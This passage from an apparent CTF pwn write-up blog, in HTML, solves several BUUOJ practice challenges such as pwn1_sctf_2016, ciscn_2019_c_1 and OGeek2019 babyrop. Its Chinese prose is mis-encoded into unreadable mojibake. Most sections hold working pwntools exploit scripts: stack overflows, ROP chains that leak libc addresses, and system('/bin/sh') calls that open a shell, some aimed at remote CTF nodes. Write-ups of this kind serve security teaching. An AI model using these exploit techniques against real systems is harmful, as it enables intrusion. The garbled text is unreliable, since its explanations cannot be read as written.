a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å¤§æ¦‚çŸ¥é“replaceå‡½æ•°çš„ä½œç”¨å…¶å®æ˜¯æŠŠ<strong>è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å­—ä¸²Aæ›¿æ¢æˆå­—ç¬¦ä¸²Bå†é‡æ–°ç”Ÿæˆæ–°çš„å­—ç¬¦ä¸²</strong>ï¼Œè€Œåœ¨vulnå‡½æ•°ä¸­Aå³ä¸º<code>&quot;I&quot;</code>ï¼ŒBå³ä¸º<code>&quot;you&quot;</code>ã€‚</p>
<p>é‡æ–°å›åˆ°<code>vuln</code>å‡½æ•°ï¼Œæˆ‘ä»¬å‘ç°ä¾ç„¶çœ‹ä¸æ‡‚è¿™æ®µä»£ç åˆ°åº•å¹²äº†å•¥</p>
<p>è¿™ä¸ªæ—¶å€™å…¶å®æˆ‘ä»¬å¯ä»¥é€‰æ‹©çœ‹æ±‡ç¼–ä»£ç è¿›è¡Œè¾…åŠ©é˜…è¯»ï¼ˆ<del>C++é€†å‘å‡ºæ¥çš„ä¸œè¥¿çœŸçš„å¤ª**äº†</del></p>
<p><img src="https://i.loli.net/2020/09/07/SCp5I7mvXc9HDWQ.png" alt="image.png"></p>
<p>ç®€å•ç»“åˆä¸€ä¸‹æ±‡ç¼–ä»£ç ä¸é€†å‘å‡ºæ¥çš„C++ä»£ç ï¼Œæˆ‘ä»¬å®¹æ˜“çŸ¥é“è¯¥æ®µä»£ç çš„ä½œç”¨ï¼Œå¦‚ä¸‹å›¾æ³¨é‡Šæ‰€ç¤ºï¼š</p>
<p><img src="https://i.loli.net/2020/09/07/vTxCYDnofhqdSKQ.png" alt="image.png"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fgets</span>(&amp;s, <span class="number">32</span>, edata);                         <span class="comment">// ä»æ ‡å‡†è¾“å…¥æµä¸­è¯»å…¥æœ€å¤§32ä¸ªå­—ç¬¦åˆ°s</span></span><br><span class="line">std::string::<span class="keyword">operator</span>=(&amp;input, &amp;s);           <span class="comment">// å°†å­—ç¬¦ä¸²sçš„å€¼æ‹·è´åˆ°stringç±»inputä¸­</span></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>((<span class="type">int</span>)&amp;v8);    <span class="comment">// æ–°æ„é€ äº†ä¸€ä¸ªallocator&lt;char&gt;ç±»çš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°v8</span></span><br><span class="line">std::string::<span class="built_in">string</span>((<span class="type">int</span>)&amp;v7, (<span class="type">int</span>)<span class="string">&quot;you&quot;</span>, (<span class="type">int</span>)&amp;v8);<span class="comment">// stringç±»ä½¿ç”¨allocratoråˆ†é…å†…å­˜å¤åˆ¶å­—ç¬¦ä¸²&quot;you&quot;å¹¶æ‹·è´åˆ°v7ä¸Š</span></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>((<span class="type">int</span>)&amp;v10);   <span class="comment">// æ–°æ„é€ äº†ä¸€ä¸ªallocator&lt;char&gt;ç±»çš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°v10</span></span><br><span class="line">std::string::<span class="built_in">string</span>((<span class="type">int</span>)&amp;v9, (<span class="type">int</span>)<span class="string">&quot;I&quot;</span>, (<span class="type">int</span>)&amp;v10);<span class="comment">// stringç±»ä½¿ç”¨allocratoråˆ†é…å†…å­˜å¤åˆ¶å­—ç¬¦ä¸²&quot;I&quot;å¹¶æ‹·è´åˆ°v6ä¸Š</span></span><br><span class="line"><span class="built_in">replace</span>((std::string *)&amp;v6, (std::string *)&amp;input, (std::string *)&amp;v9);<span class="comment">// éå†inputï¼Œç”Ÿæˆæ–°stringæŠŠåŸinputä¸­çš„&#x27;I&#x27;æ›¿æ¢ä¸º&#x27;you&#x27;ï¼Œå¹¶å°†é‡æ–°ç”Ÿæˆåçš„å­—ç¬¦ä¸²åœ°å€ç»™åˆ°v6</span></span><br><span class="line">std::string::<span class="keyword">operator</span>=(&amp;input, &amp;v6, v0);      <span class="comment">// æ‹·è´v6å›åˆ°inputä¸­ï¼Œå®Œæˆæ›¿æ¢</span></span><br><span class="line">std::string::~<span class="built_in">string</span>((std::string *)&amp;v6);     <span class="comment">// ææ„v6</span></span><br><span class="line">std::string::~<span class="built_in">string</span>((std::string *)&amp;v9);     <span class="comment">// ææ„v9</span></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v10, v1);   <span class="comment">// ææ„v10</span></span><br><span class="line">std::string::~<span class="built_in">string</span>((std::string *)&amp;v7);     <span class="comment">// ææ„v7</span></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v8, v2);    <span class="comment">// ææ„v8</span></span><br><span class="line">v3 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);<span class="comment">// å°†inputä½¿ç”¨stringç±»çš„c_strå‡½æ•°å˜æˆå­—ç¬¦ä¸²å­˜æ”¾åœ¨charæ•°ç»„ä¸­å¹¶å°†å­—ç¬¦ä¸²æŒ‡é’ˆèµ‹ç»™v3</span></span><br><span class="line"><span class="built_in">strcpy</span>(&amp;s, v3);                               <span class="comment">// å°†v3æ‹·è´åˆ°sä¸Š</span></span><br></pre></td></tr></table></figure>

<p>ç®€å•è¿è¡Œä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ç¨‹åºçš„ç¡®ä¼šæŠŠè¾“å…¥ä¸­çš„<code>I</code>å…¨éƒ¨æ›¿æ¢æˆ<code>you</code></p>
<p><img src="https://i.loli.net/2020/09/07/EkemdSOlb9Jj5IM.png" alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæº¢å‡ºå¤§æ¦‚éœ€è¦<code>0x3c</code>ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯60ä¸ªå­—èŠ‚</p>
<p><img src="https://i.loli.net/2020/09/07/7iJUWvxtPjVlckS.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä½¿ç”¨20ä¸ª<code>I</code>ä½œä¸ºpaddingï¼Œç„¶åè¿™æ®µpaddingä¼šè¢«æ›¿æ¢æˆ30ä¸ª<code>you</code>ï¼Œåˆšå¥½60ä¸ªå­—èŠ‚ï¼Œåœ¨åé¢å†è¦†ç›–æ‰ebpä¸è¿”å›åœ°å€æ§åˆ¶ç¨‹åºè¿”å›åˆ°<code>get_flag</code>å‡½æ•°å³å¯å¾—åˆ°flag</p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">get_flag_addr = <span class="number">0x8048fd</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1_sctf_2016&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,27140)</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span> + p32(<span class="number">0xdeadbeef</span>) + p32(get_flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>

<p>å‘é€payloadï¼Œå¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/09/07/nZcqDhPo5sFWm6X.png" alt="image.png"></p>
<blockquote>
<p>C++é€†å‘æ˜¯çœŸçš„kskjklasjdkajskdhasjdgsgdhsgdsajkqpiwourevz</p>
</blockquote>
<h2 id="0x005-ciscn-2019-n-1-overwrite"><a href="#0x005-ciscn-2019-n-1-overwrite" class="headerlink" title="0x005.ciscn_2019_n_1 - overwrite"></a>0x005.ciscn_2019_n_1 - overwrite</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/08/IlHxaAwpoKmFdJ5.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œmainä¸­è°ƒç”¨äº†funcå‡½æ•°ï¼Œç›´æ¥è¿›å»çœ‹</p>
<p><img src="https://i.loli.net/2020/09/08/RyLZ98UPXJp4jQh.png" alt="image.png"></p>
<p>å½“v2ä¸º11.28125æ—¶æˆ‘ä»¬å¯ä»¥è·å–flagï¼Œè€Œgetså‡½æ•°è¯»å…¥åˆ°v1å­˜åœ¨æº¢å‡ºç‚¹å¯ä»¥è¦†å†™æ‰v2</p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œ<strong>æµ®ç‚¹æ•°11.28125åœ¨å†…å­˜ä¸­æ˜¯å¦‚ä½•è¡¨ç¤ºçš„å‘¢</strong></p>
<p>æˆ‘ä»¬å¯ä»¥ç›´æ¥è·³è½¬åˆ°è¿™ä¸ªæ•°æ®æ‰€å‚¨å­˜çš„åœ°æ–¹ï¼Œå‘ç°æ˜¯<code>0x41348000</code></p>
<p><img src="https://i.loli.net/2020/09/08/wvTE9Qhr18oXU6Z.png" alt="image.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;ciscn_2019_n_1&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,27338)</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0xc</span>) + p64(<span class="number">0x401348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>

<p>å‘é€payloadï¼Œå¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/09/08/bQk98h4CdTyFAa5.png" alt="image.png"></p>
<h2 id="0x006-ciscn-2019-c-1-ret2csu-ret2libc"><a href="#0x006-ciscn-2019-c-1-ret2csu-ret2libc" class="headerlink" title="0x006.ciscn_2019_c_1 - ret2csu + ret2libc"></a>0x006.ciscn_2019_c_1 - ret2csu + ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/08/pAfovxLnPF3Cicu.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>åœ¨<code>encrypt()</code>å‡½æ•°ä¸­æˆ‘ä»¬å‘ç°ä½¿ç”¨äº†getsè¿›è¡Œè¯»å…¥ï¼Œå­˜åœ¨æº¢å‡ºç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°è¿™ä¸ªå‡½æ•°ä¼šå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œå¸¸è§„çš„payloadä¼šè¢«ç»è¿‡ç¨‹åºå¥‡æ€ªçš„å¤„ç†ï¼Œç ´åæ‰æˆ‘ä»¬çš„æ•°æ®<img src="https://i.loli.net/2020/09/08/TXCd5VxRIm2Nbfy.png" alt="image.png"></p>
<p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥å‘ç°è¯¥å‡½æ•°æ˜¯ä½¿ç”¨çš„<code>strlen()</code>å‡½æ•°æ¥åˆ¤æ–­è¾“å…¥çš„é•¿åº¦ï¼Œé‡åˆ°<code>&#39;\x00&#39;</code>æ—¶ä¼šç»ˆæ­¢ï¼Œè€Œ<code>gets()</code>å‡½æ•°é‡åˆ°<code>&#39;\x00&#39;</code>å¹¶ä¸ä¼šæˆªæ–­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†payloadå¼€å¤´çš„paddingçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç½®ä¸º<code>&#39;\x00&#39;</code>ï¼Œè¿™æ ·æˆ‘ä»¬æ‰€è¾“å…¥çš„payloadå°±ä¸ä¼šè¢«ç¨‹åºæ”¹å˜</p>
<p>æ¥ä¸‹æ¥è€ƒè™‘æ„é€ ropé“¾getshellï¼ŒåŸºæœ¬ä¸Šå·²ç»æ˜¯å›ºå®šå¥—è·¯äº†ï¼Œ<strong>é¦–å…ˆç”¨<code>puts()</code>å‡½æ•°æ³„æ¼å‡º<code>puts()</code>çš„çœŸå®åœ°å€ï¼ŒåŒæ—¶ç”±äºé¢˜ç›®æ²¡æœ‰ç»™å‡ºlibcæ–‡ä»¶ï¼Œæ•…æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘ç”¨<code>LibcSearcher</code>è·å–libcï¼Œç„¶ålibcçš„åŸºå€ã€<code>/bin/sh</code>å’Œ<code>system()</code>çš„åœ°å€å°±éƒ½å‡ºæ¥äº†ï¼Œé…åˆä¸Šcsuä¸­çš„gadgetå³å¯getshell</strong></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line">enc_addr = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">retn = <span class="number">0x400c84</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(<span class="number">0xdeafbeef</span>) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(pop_rdi) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(enc_addr)</span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_c_1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27832</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n\n&#x27;</span>)</span><br><span class="line">s = p.recv(<span class="number">6</span>)</span><br><span class="line">puts_addr = u64(s.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(retn) + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œæˆ‘ä»¬çš„expï¼ŒæˆåŠŸgetshell</p>
<p><img src="https://i.loli.net/2020/09/10/CL1T3UiExsyJbVP.png" alt="image.png"></p>
<blockquote>
<p>å‘ç”Ÿäº†å¾ˆå¤šå¾ˆç„å­¦çš„é—®é¢˜ï¼ˆğŸ‘ˆå…¶å®å°±æ˜¯æç²—å¿ƒå¤§æ„ç½¢leï¼‰ï¼Œå¯¼è‡´è¿™é“é¢˜è™½ç„¶æ—©å°±æœ‰äº†æ€è·¯ï¼Œä½†æ˜¯ç”¨çš„æ—¶é—´æ¯”é¢„æœŸè¦é•¿çš„å¤š</p>
<p>ä»¥åŠLibcSearcheråœ¨æœ¬åœ°æ— æ³•getshellï¼Œæ¢æˆæœ¬åœ°çš„libcå°±å¥½äº†ï¼ˆç„å­¦é—®é¢˜å˜å¤šäº†ï¼ˆ<del>å…¶å®åªæ˜¯LibcSearcheråº“ä¸å…¨â‘§</del>ï¼‰ï¼‰</p>
<p>ä»¥åŠUbuntu 18ä¸‹å¶å°”ä¼šå‘ç”Ÿæ ˆæ— æ³•å¯¹é½çš„æƒ…å†µï¼Œå¤šretnå‡ æ¬¡å°±å¥½äº†ï¼ˆç¡®ä¿¡ï¼‰</p>
</blockquote>
<h2 id="0x007-OGeek2019-babyrop-ret2libc"><a href="#0x007-OGeek2019-babyrop-ret2libc" class="headerlink" title="0x007.[OGeek2019]babyrop - ret2libc"></a>0x007.[OGeek2019]babyrop - ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/12/nqPDwE5WHeQsmzT.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼š</p>
<p><img src="https://i.loli.net/2020/09/12/51JOmdMVjsgAkWN.png" alt="image.png"></p>
<p>mainå‡½æ•°é¦–å…ˆä¼šè·å–ä¸€ä¸ªéšæœºæ•°ï¼Œä¼ å…¥<code>sub_804871F()</code>ä¸­</p>
<p><img src="https://i.loli.net/2020/09/12/Ijk8GHiOgxXWVdn.png" alt="image.png"></p>
<p>è¯¥å‡½æ•°ä¼šå°†éšæœºæ•°ä½œä¸ºå­—ç¬¦ä¸²è¾“å‡ºåˆ°sï¼Œä¹‹åè¯»å–æœ€å¤§0x20ä¸ªå­—èŠ‚çš„è¾“å…¥åˆ°v6ï¼Œç”¨<code>strlen()</code>è®¡ç®—v6é•¿åº¦å­˜åˆ°v1å¹¶ä¸sæ¯”å¯¹v1ä¸ªå­—èŠ‚ï¼Œè‹¥ä¸ç›¸åŒåˆ™ç›´æ¥é€€å‡ºç¨‹åº</p>
<p>è€ƒè™‘åˆ°<code>strlen()</code>å‡½æ•°ä»¥<code>&#39;\x00&#39;</code>å­—ç¬¦ä½œä¸ºç»“æŸæ ‡è¯†ç¬¦ï¼Œæ•…æˆ‘ä»¬åªéœ€è¦åœ¨è¾“å…¥å‰æ”¾ä¸Šä¸€ä¸ª<code>&#39;\x00&#39;</code>å³å¯é¿å¼€è¿™ä¸ªæ£€æµ‹</p>
<p>ä¹‹åä¼šå°†v5çš„æ•°å€¼è¿”å›åˆ°ä¸»å‡½æ•°å¹¶ä½œä¸ºå‚æ•°åˆç»™åˆ°<code>sub_80487D0()</code>å‡½æ•°ï¼Œç®€å•çœ‹ä¸€ä¸‹æˆ‘ä»¬ä¾¿å¯ä»¥å‘ç°è¯¥å‡½æ•°è¯»å–æœ€å¤§v5ä¸ªå­—èŠ‚çš„è¾“å…¥åˆ°<code>buf</code>ä¸­ï¼Œè€Œ<code>buf</code>è·ç¦»<code>ebp</code>åªæœ‰0xe7ä¸ªå­—èŠ‚</p>
<p><img src="https://i.loli.net/2020/09/13/1Y7qukt6NVJlDzd.png" alt="image.png"></p>
<p>ç”±äºæ²¡æœ‰å¯ä»¥ç›´æ¥getshellçš„å‡½æ•°ï¼Œæ•…è€ƒè™‘åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶å°†v5è¦†å†™ä¸º<code>0xff</code>ä»¥ä¿è¯èƒ½å¤Ÿè¯»å–çš„è¾“å…¥é•¿åº¦æœ€å¤§ï¼Œåœ¨ç¬¬äºŒæ¬¡è¾“å…¥æ—¶æ„é€ ropé“¾ä½¿ç”¨writeå‡½æ•°æ³„éœ²writeçš„åœ°å€ï¼Œå†ä½¿ç”¨libcsearcherå¾—åˆ°libcåŸºå€ä¸<code>system()</code>å’Œ<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²çš„åœ°å€ï¼Œæœ€åæ„é€ ropé“¾è°ƒç”¨<code>system(&quot;/bin/sh&quot;)</code>å³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="number">7</span>* <span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xe7</span> + p32(<span class="number">0xdeadbeef</span>) + p32(write_plt) + p32(<span class="number">0x80487d0</span>) + p32(<span class="number">0x1</span>) + p32(write_got) + p32(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,25330)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¯getshell</p>
<p><img src="https://i.loli.net/2020/09/13/SOvMLpHGFVaQfZb.png" alt="image.png"></p>
<h2 id="0x008-jarvisoj-level0-ret2text"><a href="#0x008-jarvisoj-level0-ret2text" class="headerlink" title="0x008.jarvisoj_level0 - ret2text"></a>0x008.jarvisoj_level0 - ret2text</h2><blockquote>
<p>å¥½å¤šé‡å¤è€ƒç‚¹çš„ç®€å•é¢˜å•Šâ€¦</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/18/utzZo2RkpGUC7Yj.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ªå¯ä»¥æº¢å‡ºçš„å‡½æ•°<code>vulnerable_function()</code>ï¼Œåªéœ€è¦<code>0x80</code>ä¸ªå­—èŠ‚å³å¯æº¢å‡º</p>
<p><img src="https://i.loli.net/2020/09/18/kFVOigZbem3U1yr.png" alt="image.png"></p>
<p>åŒæ—¶å­˜åœ¨ä¸€ä¸ªå¯ä»¥ç›´æ¥getshellçš„å‡½æ•°<code>callsystem()</code></p>
<p>ç›´æ¥æ„é€ payloadè¦†å†™è¿”å›åœ°å€åˆ°<code>callsystem()</code>å‡½æ•°å³å¯getshell</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;level0&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,29367)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/18/ykhU4DgzILKvQXG.png" alt="image.png"></p>
<h2 id="0x009-ciscn-2019-en-2-ret2csu-ret2libc"><a href="#0x009-ciscn-2019-en-2-ret2csu-ret2libc" class="headerlink" title="0x009.ciscn_2019_en_2 - ret2csu + ret2libc"></a>0x009.ciscn_2019_en_2 - ret2csu + ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/18/Fv6MeQnd4fU8Rmr.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ<del>æ„Ÿè§‰è¿™é¢˜å¥½åƒåœ¨å“ªä¸ªåœ°æ–¹åšè¿‡çš„æ ·å­</del>ï¼ˆ<del>ciscn_2019_c_1</del>ï¼‰</p>
<p>åœ¨<code>encrypt()</code>å‡½æ•°ä¸­æˆ‘ä»¬å‘ç°ä½¿ç”¨äº†getsè¿›è¡Œè¯»å…¥ï¼Œå­˜åœ¨æº¢å‡ºç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°è¿™ä¸ªå‡½æ•°ä¼šå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œå¸¸è§„çš„payloadä¼šè¢«ç»è¿‡ç¨‹åºå¥‡æ€ªçš„å¤„ç†ï¼Œç ´åæ‰æˆ‘ä»¬çš„æ•°æ®<img src="https://i.loli.net/2020/09/08/TXCd5VxRIm2Nbfy.png" alt="image.png"></p>
<p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥å‘ç°è¯¥å‡½æ•°æ˜¯ä½¿ç”¨çš„<code>strlen()</code>å‡½æ•°æ¥åˆ¤æ–­è¾“å…¥çš„é•¿åº¦ï¼Œé‡åˆ°<code>&#39;\x00&#39;</code>æ—¶ä¼šç»ˆæ­¢ï¼Œè€Œ<code>gets()</code>å‡½æ•°é‡åˆ°<code>&#39;\x00&#39;</code>å¹¶ä¸ä¼šæˆªæ–­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†payloadå¼€å¤´çš„paddingçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç½®ä¸º<code>&#39;\x00&#39;</code>ï¼Œè¿™æ ·æˆ‘ä»¬æ‰€è¾“å…¥çš„payloadå°±ä¸ä¼šè¢«ç¨‹åºæ”¹å˜</p>
